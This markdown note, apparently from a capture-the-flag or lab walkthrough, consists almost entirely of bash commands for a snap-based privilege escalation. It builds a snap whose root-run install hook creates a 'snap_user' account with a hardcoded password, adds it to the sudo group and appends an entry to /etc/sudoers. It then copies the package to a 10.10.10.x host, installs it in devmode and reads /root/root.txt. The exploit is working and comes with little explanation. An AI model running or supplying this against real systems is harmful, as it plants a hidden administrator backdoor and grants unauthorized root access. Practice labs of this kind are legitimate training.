# snap

```bash
sudo -l
```

```bash
sudo apt update
sudo apt install snapd
sudo snap install --classic snapcraft
```

```bash
# Make an empty directory to work with
mkdir new_snap
cd new_snap
# Initialize the directory as a snap project
snapcraft init
# Set up the install hook
mkdir snap/hooks
touch snap/hooks/install
chmod a+x snap/hooks/install
# Write the script we want to execute as root
cat > snap/hooks/install << "EOF"
#!/bin/bash
password="snap_user"
pass=$(perl -e 'print crypt($ARGV[0], "password")' $password)
useradd snap_user -m -p $pass -s /bin/bash
usermod -aG sudo snap_user
echo "snap_user    ALL=(ALL:ALL) ALL" >> /etc/sudoers
EOF
# Configure the snap yaml file
cat > snap/snapcraft.yaml << "EOF"
name: snap-user
version: '0.1'
summary: Empty snap, used for exploit
description: |
    This is an example
grade: devel
confinement: devmode
parts:
  my-part:
    plugin: nil
EOF
# Build the snap
snapcraft
```

```bash
chmod +x snapcraft.sh
./snapcraft.sh
```

```bash
scp -r new_snap brucetherealadmin@10.10.10.99:/tmp
```

```bash
cd /tmp/new_snap
sudo snap install --devmode snap-user_0.1_amd64.snap
```

```bash
snap list
```

```bash
 cat /etc/passwd
```

```bash
su snap_user
sudo -l
```

```bash
cat /root/root.txt
```
